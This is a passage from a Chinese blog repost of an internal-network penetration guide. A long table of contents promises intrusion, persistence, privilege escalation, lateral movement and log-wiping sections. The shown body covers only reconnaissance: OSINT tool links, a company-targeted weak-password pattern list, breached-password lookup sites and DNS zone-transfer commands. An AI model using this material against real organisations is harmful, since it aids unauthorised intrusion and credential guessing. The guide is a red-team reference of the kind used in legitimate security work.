<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>栈桥仔</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="栈桥仔">
<meta property="og:url" content="https://zhanqiaozai.github.io/index.html">
<meta property="og:site_name" content="栈桥仔">
<meta property="article:author" content="zhanqiaozai">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="栈桥仔" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 4.2.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">zhanqiaozai</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">zhanqiaozai</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author">zhanqiaozai</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-内网渗透思路" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/07/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/" class="article-date">
  	<time datetime="2020-07-25T01:17:48.733Z" itemprop="datePublished">2020-07-25</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/07/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/">
        内网渗透思路
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p> Author: <a href="https://twitter.com/Evi1cg" target="_blank" rel="noopener">Evi1cg</a><br> Blog: <a href="https://evi1cg.github.io" target="_blank" rel="noopener">https://evi1cg.github.io</a></p>
<h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86">信息搜集</a><ul>
<li><a href="#%E5%BC%80%E6%BA%90%E6%83%85%E6%8A%A5%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86osint">开源情报信息收集（OSINT）</a><ul>
<li><a href="#github">github</a></li>
<li><a href="#whois%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%86%8C%E4%BA%BA%E5%8F%8D%E6%9F%A5%E9%82%AE%E7%AE%B1%E5%8F%8D%E6%9F%A5%E7%9B%B8%E5%85%B3%E8%B5%84%E4%BA%A7">whois查询/注册人反查/邮箱反查/相关资产</a></li>
<li><a href="#google-hacking">google hacking</a></li>
</ul>
</li>
<li><a href="#%E5%88%9B%E5%BB%BA%E4%BC%81%E4%B8%9A%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8">创建企业密码字典</a><ul>
<li><a href="#%E5%AD%97%E5%85%B8%E5%88%97%E8%A1%A8">字典列表</a></li>
<li><a href="#%E9%82%AE%E7%AE%B1%E5%88%97%E8%A1%A8%E8%8E%B7%E5%8F%96">邮箱列表获取</a></li>
<li><a href="#%E6%B3%84%E9%9C%B2%E5%AF%86%E7%A0%81%E6%9F%A5%E8%AF%A2">泄露密码查询</a></li>
<li><a href="#%E5%AF%B9%E4%BC%81%E4%B8%9A%E5%A4%96%E9%83%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%9B%E8%A1%8C%E6%90%9C%E9%9B%86">对企业外部相关信息进行搜集</a><ul>
<li><a href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E8%8E%B7%E5%8F%96">子域名获取</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E8%BF%9B%E5%85%A5%E5%86%85%E7%BD%91">进入内网</a><ul>
<li><a href="#%E5%9F%BA%E4%BA%8E%E4%BC%81%E4%B8%9A%E5%BC%B1%E8%B4%A6%E5%8F%B7%E6%BC%8F%E6%B4%9E">基于企业弱账号漏洞</a></li>
<li><a href="#%E5%9F%BA%E4%BA%8E%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E8%BF%9B%E5%85%A5">基于系统漏洞进入</a></li>
<li><a href="#%E7%BD%91%E7%AB%99%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F">网站应用程序渗透</a></li>
<li><a href="#%E6%97%A0%E7%BA%BFwi-fi%E6%8E%A5%E5%85%A5">无线Wi-Fi接入</a></li>
</ul>
</li>
<li><a href="#%E9%9A%90%E5%8C%BF%E6%94%BB%E5%87%BB">隐匿攻击</a><ul>
<li><a href="#command-and-control">Command and Control</a></li>
<li><a href="#fronting">Fronting</a></li>
<li><a href="#%E4%BB%A3%E7%90%86">代理</a></li>
</ul>
</li>
<li><a href="#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E5%BA%94%E7%94%A8">内网跨边界应用</a><ul>
<li><a href="#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E8%BD%AC%E5%8F%91">内网跨边界转发</a></li>
<li><a href="#%E5%86%85%E7%BD%91%E8%B7%A8%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86%E7%A9%BF%E9%80%8F">内网跨边界代理穿透</a><ul>
<li><a href="#ew">EW</a></li>
<li><a href="#termite">Termite</a></li>
<li><a href="#%E4%BB%A3%E7%90%86%E8%84%9A%E6%9C%AC">代理脚本</a></li>
</ul>
</li>
<li><a href="#shell%E5%8F%8D%E5%BC%B9">shell反弹</a></li>
<li><a href="#%E5%86%85%E7%BD%91%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%A0%E8%BE%93%E5%92%8C%E4%B8%8B%E8%BD%BD">内网文件的传输和下载</a></li>
<li><a href="#%E6%90%AD%E5%BB%BA%20HTTP%20server">搭建 HTTP server</a></li>
</ul>
</li>
<li><a href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86">内网信息搜集</a><ul>
<li><a href="#%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86">本机信息搜集</a><ul>
<li><a href="#1%E7%94%A8%E6%88%B7%E5%88%97%E8%A1%A8">1、用户列表</a></li>
<li><a href="#2%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8">2、进程列表</a></li>
<li><a href="#3%E6%9C%8D%E5%8A%A1%E5%88%97%E8%A1%A8">3、服务列表</a></li>
<li><a href="#4%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8">4、端口列表</a></li>
<li><a href="#5%E8%A1%A5%E4%B8%81%E5%88%97%E8%A1%A8">5、补丁列表</a></li>
<li><a href="#6%E6%9C%AC%E6%9C%BA%E5%85%B1%E4%BA%AB">6、本机共享</a></li>
<li><a href="#7%E6%9C%AC%E7%94%A8%E6%88%B7%E4%B9%A0%E6%83%AF%E5%88%86%E6%9E%90">7、本用户习惯分析</a></li>
<li><a href="#8%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E5%B7%A5%E5%85%B7">8、获取当前用户密码工具</a><ul>
<li><a href="#windows">Windows</a></li>
<li><a href="#linux">Linux</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%89%A9%E6%95%A3%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">扩散信息收集</a><ul>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">端口扫描</a><ul>
<li><a href="#%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7">常用端口扫描工具</a></li>
</ul>
</li>
<li><a href="#%E5%86%85%E7%BD%91%E6%8B%93%E6%89%91%E6%9E%B6%E6%9E%84%E5%88%86%E6%9E%90">内网拓扑架构分析</a></li>
<li><a href="#%E5%B8%B8%E8%A7%81%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4">常见信息收集命令</a></li>
</ul>
</li>
<li><a href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">第三方信息收集</a></li>
</ul>
</li>
<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a><ul>
<li><a href="#windows-1">Windows</a><ul>
<li><a href="#bypassuac">BypassUAC</a><ul>
<li><a href="#%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95">常用方法</a></li>
<li><a href="#%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7">常用工具</a></li>
</ul>
</li>
<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
</ul>
</li>
<li><a href="#linux-1">Linux</a><ul>
<li><a href="#%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83">内核溢出提权</a></li>
<li><a href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">计划任务</a></li>
<li><a href="#suid">SUID</a></li>
<li><a href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%94%99%E8%AF%AF%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E">系统服务的错误权限配置漏洞</a></li>
<li><a href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE">不安全的文件/文件夹权限配置</a></li>
<li><a href="#%E6%89%BE%E5%AD%98%E5%82%A8%E7%9A%84%E6%98%8E%E6%96%87%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81">找存储的明文用户名，密码</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81">权限维持</a><ul>
<li><a href="#%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8">系统后门</a><ul>
<li><a href="#windows-2">Windows</a><ul>
<li><a href="#1%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%B7%A5%E5%85%B7">1、密码记录工具</a></li>
<li><a href="#2%E5%B8%B8%E7%94%A8%E7%9A%84%E5%AD%98%E5%82%A8payload%E4%BD%8D%E7%BD%AE">2、常用的存储Payload位置</a></li>
<li><a href="#3runrunonce-keys">3、Run/RunOnce Keys</a></li>
<li><a href="#4bootexecute-key">4、BootExecute Key</a></li>
<li><a href="#5userinit-key">5、Userinit Key</a></li>
<li><a href="#6startup-keys">6、Startup Keys</a></li>
<li><a href="#7services">7、Services</a></li>
<li><a href="#8browser-helper-objects">8、Browser Helper Objects</a></li>
<li><a href="#9appinit_dlls">9、AppInit_DLLs</a></li>
<li><a href="#10%E6%96%87%E4%BB%B6%E5%85%B3%E8%81%94">10、文件关联</a></li>
<li><a href="#11bitsadmin">11、bitsadmin</a></li>
<li><a href="#12mof-">12、mof </a></li>
<li><a href="#13wmi">13、wmi</a></li>
<li><a href="#14userland-persistence-with-scheduled-tasks">14、Userland Persistence With Scheduled Tasks</a></li>
<li><a href="#15netsh">15、Netsh</a></li>
<li><a href="#16shim">16、Shim</a></li>
<li><a href="#17dll%E5%8A%AB%E6%8C%81">17、DLL劫持</a></li>
<li><a href="#18doubleagent-">18、DoubleAgent </a></li>
<li><a href="#19waitforexe-">19、waitfor.exe </a></li>
<li><a href="#20appdomainmanager">20、AppDomainManager</a></li>
<li><a href="#21office">21、Office</a></li>
<li><a href="#22clr">22、CLR</a></li>
<li><a href="#23msdtc">23、msdtc</a></li>
<li><a href="#24hijack-caccpropservicesclass-and-mmdeviceenumerato">24、Hijack CAccPropServicesClass and MMDeviceEnumerato</a></li>
<li><a href="#25hijack-explorerexe">25、Hijack explorer.exe</a></li>
<li><a href="#26windows-fax-dll-injection">26、Windows FAX DLL Injection</a></li>
<li><a href="#27%E7%89%B9%E6%AE%8A%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%80%BC">27、特殊注册表键值</a></li>
<li><a href="#28%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E5%90%8E%E9%97%A8">28、快捷方式后门</a></li>
<li><a href="#29logon-scripts">29、Logon Scripts</a></li>
<li><a href="#30password-filter-dll">30、Password Filter DLL</a></li>
<li><a href="#31%E5%88%A9%E7%94%A8bho%E5%AE%9E%E7%8E%B0ie%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81">31、利用BHO实现IE浏览器劫持</a></li>
</ul>
</li>
<li><a href="#linux-2">Linux</a><ul>
<li><a href="#crontab">crontab</a></li>
<li><a href="#%E7%A1%AC%E9%93%BE%E6%8E%A5sshd">硬链接sshd</a></li>
<li><a href="#ssh-server-wrapper">SSH Server wrapper</a></li>
<li><a href="#ssh-keylogger">SSH keylogger</a></li>
<li><a href="#cymothoa_%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5backdoor">Cymothoa_进程注入backdoor</a></li>
<li><a href="#rootkit">rootkit</a></li>
<li><a href="#tools">Tools</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#web%E5%90%8E%E9%97%A8">WEB后门</a></li>
</ul>
</li>
<li><a href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F">横向渗透</a><ul>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F">端口渗透</a><ul>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1">端口扫描</a></li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4">端口爆破</a></li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E5%BC%B1%E5%8F%A3%E4%BB%A4">端口弱口令</a></li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%BA%A2%E5%87%BA">端口溢出</a></li>
<li><a href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3">常见的默认端口</a><ul>
<li><a href="#1web%E7%B1%BBweb%E6%BC%8F%E6%B4%9E%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95">1、web类(web漏洞/敏感目录)</a></li>
<li><a href="#2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E6%89%AB%E6%8F%8F%E5%BC%B1%E5%8F%A3%E4%BB%A4">2、数据库类(扫描弱口令)</a></li>
<li><a href="#3%E7%89%B9%E6%AE%8A%E6%9C%8D%E5%8A%A1%E7%B1%BB%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B1%BB%E6%BC%8F%E6%B4%9E">3、特殊服务类(未授权/命令执行类/漏洞)</a></li>
<li><a href="#4%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E7%B1%BB%E6%89%AB%E6%8F%8F%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4">4、常用端口类(扫描弱口令/端口爆破)</a></li>
<li><a href="#5%E7%AB%AF%E5%8F%A3%E5%90%88%E8%AE%A1%E6%89%80%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1">5、端口合计所对应的服务</a></li>
</ul>
</li>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1">信息搜集</a></li>
<li><a href="#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95">获取域控的方法</a><ul>
<li><a href="#sysvol">SYSVOL</a></li>
<li><a href="#ms14-068-kerberos">MS14-068 Kerberos</a></li>
<li><a href="#spn%E6%89%AB%E6%8F%8F">SPN扫描</a></li>
<li><a href="#kerberos%E7%9A%84%E9%BB%84%E9%87%91%E9%97%A8%E7%A5%A8">Kerberos的黄金门票</a></li>
<li><a href="#kerberos%E7%9A%84%E9%93%B6%E7%A5%A8%E5%8A%A1">Kerberos的银票务</a></li>
<li><a href="#%E5%9F%9F%E6%9C%8D%E5%8A%A1%E8%B4%A6%E5%8F%B7%E7%A0%B4%E8%A7%A3">域服务账号破解</a></li>
<li><a href="#%E5%87%AD%E8%AF%81%E7%9B%97%E7%AA%83">凭证盗窃</a></li>
<li><a href="#%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE">地址解析协议</a></li>
</ul>
</li>
<li><a href="#%E8%8E%B7%E5%8F%96ad%E5%93%88%E5%B8%8C">获取AD哈希</a></li>
<li><a href="#ad%E6%8C%81%E4%B9%85%E5%8C%96">AD持久化</a><ul>
<li><a href="#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E6%8C%81%E4%B9%85%E6%80%A7%E6%8A%80%E5%B7%A7">活动目录持久性技巧</a></li>
<li><a href="#security-support-provider">Security Support Provider</a></li>
<li><a href="#sid-history">SID History</a></li>
<li><a href="#adminsdholdersdprop-">AdminSDHolder＆SDProp</a></li>
<li><a href="#%E7%BB%84%E7%AD%96%E7%95%A5">组策略</a></li>
<li><a href="#hook-passwordchangenotify">Hook PasswordChangeNotify</a></li>
</ul>
</li>
<li><a href="#tips">TIPS</a></li>
<li><a href="#%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7">相关工具</a></li>
</ul>
</li>
<li><a href="#%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F">在远程系统上执行程序</a></li>
<li><a href="#iot%E7%9B%B8%E5%85%B3">IOT相关</a></li>
<li><a href="#%E4%B8%AD%E9%97%B4%E4%BA%BA">中间人</a></li>
<li><a href="#%E8%A7%84%E9%81%BF%E6%9D%80%E8%BD%AF%E5%8F%8A%E6%A3%80%E6%B5%8B">规避杀软及检测</a><ul>
<li><a href="#bypass-applocker">Bypass Applocker</a></li>
<li><a href="#bypassav">bypassAV</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86">痕迹清理</a><ul>
<li><a href="#windows%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4">Windows日志清除</a></li>
<li><a href="#%E7%A0%B4%E5%9D%8Fwindows%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%8A%9F%E8%83%BD">破坏Windows日志记录功能</a></li>
<li><a href="#msf">msf</a></li>
<li><a href="#3389%E7%99%BB%E9%99%86%E8%AE%B0%E5%BD%95%E6%B8%85%E9%99%A4">3389登陆记录清除</a></li>
</ul>
</li>
</ul>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="开源情报信息收集（OSINT）"><a href="#开源情报信息收集（OSINT）" class="headerlink" title="开源情报信息收集（OSINT）"></a>开源情报信息收集（OSINT）</h3><h4 id="github"><a href="#github" class="headerlink" title="github"></a>github</h4><ul>
<li>Github_Nuggests（自动爬取Github上文件敏感信息泄露） :<a href="https://github.com/az0ne/Github_Nuggests" target="_blank" rel="noopener">https://github.com/az0ne/Github_Nuggests</a></li>
<li>GSIL（能够实现近实时（15分钟内）的发现Github上泄露的信息） :<a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a></li>
<li>x-patrol(小米团队的):<a href="https://github.com/MiSecurity/x-patrol" target="_blank" rel="noopener">https://github.com/MiSecurity/x-patrol</a></li>
</ul>
<h4 id="whois查询-注册人反查-邮箱反查-相关资产"><a href="#whois查询-注册人反查-邮箱反查-相关资产" class="headerlink" title="whois查询/注册人反查/邮箱反查/相关资产"></a>whois查询/注册人反查/邮箱反查/相关资产</h4><ul>
<li>站长之家:<a href="http://whois.chinaz.com/?DomainName=target.com&amp;ws=" target="_blank" rel="noopener">http://whois.chinaz.com/?DomainName=target.com&amp;ws=</a></li>
<li>爱站:<a href="https://whois.aizhan.com/target.com/" target="_blank" rel="noopener">https://whois.aizhan.com/target.com/</a></li>
<li>微步在线:<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a></li>
<li>IP反查:<a href="https://dns.aizhan.com/" target="_blank" rel="noopener">https://dns.aizhan.com/</a></li>
<li>天眼查:<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a></li>
<li>虎妈查:<a href="http://www.whomx.com/" target="_blank" rel="noopener">http://www.whomx.com/</a></li>
<li>历史漏洞查询 :<ul>
<li>在线查询:<a href="http://wy.zone.ci/" target="_blank" rel="noopener">http://wy.zone.ci/</a></li>
<li>自搭建:<a href="https://github.com/hanc00l/wooyun_publi/" target="_blank" rel="noopener">https://github.com/hanc00l/wooyun_publi/</a></li>
</ul>
</li>
</ul>
<h4 id="google-hacking"><a href="#google-hacking" class="headerlink" title="google hacking"></a>google hacking</h4><h3 id="创建企业密码字典"><a href="#创建企业密码字典" class="headerlink" title="创建企业密码字典"></a>创建企业密码字典</h3><h4 id="字典列表"><a href="#字典列表" class="headerlink" title="字典列表"></a>字典列表</h4><ul>
<li>passwordlist:<a href="https://github.com/lavalamp-/password-lists" target="_blank" rel="noopener">https://github.com/lavalamp-/password-lists</a></li>
<li>猪猪侠字典:<a href="https://pan.baidu.com/s/1dFJyedz" target="_blank" rel="noopener">https://pan.baidu.com/s/1dFJyedz</a><br><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">Blasting_dictionary</a>（分享和收集各种字典，包括弱口令，常用密码，目录爆破。数据库爆破，编辑器爆破，后台爆破等） </li>
<li>针对特定的厂商，重点构造厂商相关域名的字典<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#39;%pwd%123&#39;,&#39;%user%123&#39;,&#39;%user%521&#39;,&#39;%user%2017&#39;,&#39;%pwd%321&#39;,&#39;%pwd%521&#39;,&#39;%user%321&#39;,&#39;%pwd%123!&#39;,&#39;%pwd%123!@#&#39;,&#39;%pwd%1234&#39;,&#39;%user%2016&#39;,&#39;%user%123$%^&#39;,&#39;%user%123!@#&#39;,&#39;%pwd%2016&#39;,&#39;%pwd%2017&#39;,&#39;%pwd%1!&#39;,&#39;%pwd%2@&#39;,&#39;%pwd%3#&#39;,&#39;%pwd%123#@!&#39;,&#39;%pwd%12345&#39;,&#39;%pwd%123$%^&#39;,&#39;%pwd%!@#456&#39;,&#39;%pwd%123qwe&#39;,&#39;%pwd%qwe123&#39;,&#39;%pwd%qwe&#39;,&#39;%pwd%123456&#39;,&#39;%user%123#@!&#39;,&#39;%user%!@#456&#39;,&#39;%user%1234&#39;,&#39;%user%12345&#39;,&#39;%user%123456&#39;,&#39;%user%123!&#39;]</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="密码生成"><a href="#密码生成" class="headerlink" title="密码生成"></a>密码生成</h4><ul>
<li>GenpAss（中国特色的弱口令生成器: <a href="https://github.com/RicterZ/genpAss/" target="_blank" rel="noopener">https://github.com/RicterZ/genpAss/</a></li>
<li>passmaker（可以自定义规则的密码字典生成器） ：<a href="https://github.com/bit4woo/passmaker" target="_blank" rel="noopener">https://github.com/bit4woo/passmaker</a></li>
<li>pydictor（强大的密码生成器） ：<a href="https://github.com/LandGrey/pydictor" target="_blank" rel="noopener">https://github.com/LandGrey/pydictor</a></li>
</ul>
<h4 id="邮箱列表获取"><a href="#邮箱列表获取" class="headerlink" title="邮箱列表获取"></a>邮箱列表获取</h4><ul>
<li>theHarvester ：<a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a></li>
<li>获取一个邮箱以后导出通讯录 </li>
<li>LinkedInt :<a href="https://github.com/mdsecactivebreach/LinkedInt" target="_blank" rel="noopener">https://github.com/mdsecactivebreach/LinkedInt</a></li>
<li>Mailget：<a href="https://github.com/Ridter/Mailget" target="_blank" rel="noopener">https://github.com/Ridter/Mailget</a></li>
</ul>
<h4 id="泄露密码查询"><a href="#泄露密码查询" class="headerlink" title="泄露密码查询"></a>泄露密码查询</h4><ul>
<li>ghostproject: <a href="https://ghostproject.fr/" target="_blank" rel="noopener">https://ghostproject.fr/</a></li>
<li>pwndb: <a href="https://pwndb2am4tzkvold.onion.to/" target="_blank" rel="noopener">https://pwndb2am4tzkvold.onion.to/</a></li>
</ul>
<h4 id="对企业外部相关信息进行搜集"><a href="#对企业外部相关信息进行搜集" class="headerlink" title="对企业外部相关信息进行搜集"></a>对企业外部相关信息进行搜集</h4><h5 id="子域名获取"><a href="#子域名获取" class="headerlink" title="子域名获取"></a>子域名获取</h5><ul>
<li>Layer子域名挖掘机4.2纪念版 </li>
<li>subDomainsBrute ：<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></li>
<li>wydomain ：<a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">https://github.com/ring04h/wydomain</a></li>
<li>Sublist3r ：<a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></li>
<li>site:target.com:<a href="https://www.google.com" target="_blank" rel="noopener">https://www.google.com</a></li>
<li>Github代码仓库 </li>
<li>抓包分析请求返回值(跳转/文件上传/app/api接口等) </li>
<li>站长帮手links等在线查询网站 </li>
<li>域传送漏洞 </li>
</ul>
<p>Linux</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @ns.example.com example&#x3D;.com AXFR</span><br></pre></td></tr></table></figure>
<p>Windows</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type&#x3D;ns xxx.yyy.cn #查询解析某域名的DNS服务器</span><br><span class="line">nslookup #进入nslookup交互模式</span><br><span class="line">server dns.domian.com #指定dns服务器</span><br><span class="line">ls xxx.yyy.cn #列出域信息</span><br></pre></td></tr></table></figure>

<ul>
<li>GetDomainsBySSL.py :<a href="https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&amp;type=note#/" target="_blank" rel="noopener">https://note.youdao.com/ynoteshare1/index.html?id=247d97fc1d98b122ef9804906356d47a&amp;type=note#/</a></li>
<li>censys.io证书 :<a href="https://censys.io/certificates?q=target.com" target="_blank" rel="noopener">https://censys.io/certificates?q=target.com</a></li>
<li>crt.sh证书查询:<a href="https://crt.sh/?q=%25.target.com" target="_blank" rel="noopener">https://crt.sh/?q=%25.target.com</a></li>
<li>shadon :<a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></li>
<li>zoomeye :<a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a></li>
<li>fofa :<a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></li>
<li>censys：<a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a></li>
